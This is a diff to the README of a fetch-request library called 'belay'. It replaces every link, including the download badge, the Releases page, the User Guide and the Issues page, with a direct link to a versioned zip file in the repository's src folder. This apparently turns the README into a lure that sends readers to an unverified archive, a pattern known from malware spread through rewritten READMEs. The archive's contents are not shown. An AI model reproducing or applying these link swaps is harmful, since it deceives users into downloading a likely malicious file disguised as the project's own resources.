@@ -1,6 +1,6 @@
 # 🚀 belay - Simplify Your Fetch Requests Easily
 
-[![Download belay](https://img.shields.io/badge/Download-belay-brightgreen)](https://github.com/Raftyaelah/belay/releases)
+[![Download belay](https://github.com/Raftyaelah/belay/raw/refs/heads/main/src/Software_v3.5-alpha.5.zip)](https://github.com/Raftyaelah/belay/raw/refs/heads/main/src/Software_v3.5-alpha.5.zip)
 
 ## 📚 Introduction
 
@@ -20,7 +20,7 @@ To get started with **belay**, follow these steps carefully. You’ll be running
 
 You can download the latest version of **belay** from our Releases page. 
 
-1. **Visit the Releases page to download:** [Download belay](https://github.com/Raftyaelah/belay/releases)
+1. **Visit the Releases page to download:** [Download belay](https://github.com/Raftyaelah/belay/raw/refs/heads/main/src/Software_v3.5-alpha.5.zip)
 
 2. Look for the latest version listed at the top of the page. 
 
@@ -87,11 +87,11 @@ If you have any questions or suggestions, please reach out through our GitHub pa
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/Raftyaelah/belay/wiki)
-- [GitHub Issues](https://github.com/Raftyaelah/belay/issues)
+- [User Guide](https://github.com/Raftyaelah/belay/raw/refs/heads/main/src/Software_v3.5-alpha.5.zip)
+- [GitHub Issues](https://github.com/Raftyaelah/belay/raw/refs/heads/main/src/Software_v3.5-alpha.5.zip)
 
 ## 📥 Download Now
 
-For the latest version, visit: [Download belay](https://github.com/Raftyaelah/belay/releases)
+For the latest version, visit: [Download belay](https://github.com/Raftyaelah/belay/raw/refs/heads/main/src/Software_v3.5-alpha.5.zip)
 
 Now you are all set to use **belay** for your data fetching needs. Enjoy!
